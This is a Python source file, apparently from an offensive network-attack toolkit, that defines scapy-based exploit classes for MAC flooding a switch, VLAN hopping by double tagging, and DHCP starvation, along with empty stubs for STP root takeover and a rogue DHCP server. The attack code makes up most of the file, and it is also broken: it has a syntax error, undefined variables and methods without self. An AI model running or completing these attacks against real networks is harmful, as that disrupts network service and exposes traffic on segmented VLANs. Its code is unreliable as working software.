# /usr/bin/python3
from scapy.all import *
from threading import Thread
from time import sleep


class MacFlood(Exploit):
    """
    This exploit implements a basic MAC Flooding attack - by flooding a switch with fake MAC addresses, the switch will no longer have space in its MAC address table and packets from then on will be flooded to all hosts including the attacker
    """

    def __init__(self):
        super().__init__()
        self.verbosity = 0
        self.vendor = 'b8:e8:56:'
        self.target_mac = 'FF:FF:FF:FF:FF:FF'
        self.name = "MAC Flood"
        self.about = "MAC Flood: MAC Flooding attack to flood the switch's MAC address table"

        self.params = {
            "verbosity": self.verbosity,
            "vendor": self.vendor,
            "target_mac": self.target_mac,
        }

    def exploit(self):
        """
        As MAC address tables have a default decay timing of 300 seconds, to perpetutate this attack packets need to be constantly sent at a optimal rate.
        """
        logging.info(f"Beginning MAC Flood attack on {self.target_ip}")

        self.setup()

        while True:
            try:
                randMAC = vendor + ':'.join(RandMAC().split(':')[3:])
                print(randMAC)
                sendp(Ether(src=randMAC, dst=self.target_mac) / ARP(op=2, psrc="0.0.0.0",
                                                                    hwdst=self.target_mac) / Padding(load="X"*18), verbose=self.verbosity)
            except KeyboardInterrupt:
                logging.info("Ending MAC Flooding Attack...")
                break

# Maybe implement threading? idk


# class switch_spoof(Exploit):
    """
    this attack is weird and i have no idea how to implement it since its only making our computer to enable trunking
    """


class double_tagging(Exploit):
    """
    Double tagging attack such that we can access a vlan we are not supposed to
    """

    def __init__(self):
        super().__init__()
        self.native_vlan = native_vlan
        self.target_vlan = target_vlan
        self.target_ip = target_ip
        self.name = "Vlan Hopping(Double tagging attack)"
        self.about = "Vlan Hopping(Double tagging attack): Sending a double 802.1q encapsulated packet with the inner vlan the target vlan and the outer vlan our vlan"

        self.params = {
            "native_vlan": self.native_vlan,
            "dest_vlan": self.target_vlan,
            "target_ip": self.target_ip,
        }

    def exploit(self):
        """
        Sends the double tagged packet out
        """
        try:
            dbl_tagged_pkt = Ether() / Dot1Q(vlan=self.native_vlan) / \
                Dot1Q(vlan=self.target_vlan) / IP(dst=self.target_ip) / ICMP()
            sendp(dbl_tagged_pkt)

        except Exception as e:
            logging.info("Exploit failed...")
            print(e)


class STPattack(Exploit):
    """
    Sends a BPDU with lower BID to take over the root switch
    """


class DHCPstarve(Exploit):
    """
    Basic DHCP Starvation attack to send many DHCPDiscover pkts
    """

    def __init__(self):
        super().__init__()
        self.src_mac = src_mac
        self.
        self.name = "DHCP Starve"
        self.about = "DHCP Starve: Send so many DHCP Discover packets that we hoard all IPs offered by the DHCP server"

        self.params = {
            "src_mac": self.src_mac,

        }

    def callback_dhcp_handle(pkt):
        """
        Function to handle captured DHCP packets
        """
        if pkt.haslayer(DHCP):
            if pkt[DHCP].options[0][1] == 5 and pkt[IP].dst != "192.168.1.38":
                ip.append(pkt[IP].dst)
                print(str(pkt[IP].dst)+" registered")
            elif pkt[DHCP].options[0][1] == 6:
                print("NAK received")

    def sniff_udp_packets():
        """
        Function to sniff UDP packets to the port 67 and 68
        """
        sniff(filter="udp and (port 67 or port 68)",
              prn=callback_dhcp_handle,
              store=0)

    def occupy_IP():
        """
        Crafting DHCPRequest packet and send it to the DHCP server/ our target
        """
        for i in range(250):
            requested_addr = "192.168.1."+str(2+i)

            if requested_addr in ip:
                continue

            src_mac = ""

            while src_mac in mac:
                src_mac = RandMAC()

            mac.append(src_mac)

            pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
            pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
            pkt /= UDP(sport=68, dport=67)
            pkt /= BOOTP(chaddr="\x00\x00\x00\x00\x00\x00", xid=0x10000000)
            pkt /= DHCP(options=[("message-type", "request"),
                                 ("requested_addr", requested_addr),
                                 ("server_id", "192.168.1.1"),
                                 "end"])
            sendp(pkt)
            print("Trying to occupy " + requested_addr)
            sleep(0.2)  # interval to avoid congestion and packet loss

    def exploit():
        try:
            thread = Thread(target=sniff_udp_packets)
            thread.start()
            print("Starting DHCP starvation...")
            while len(ip) < 100:
                occupy_IP()
            print("Targeted IP address starved")
        except Exception as e:
            logging.info("Exploit failed...")
            print(e)


class setup_rogue_dhcp(Exploit):
    pass
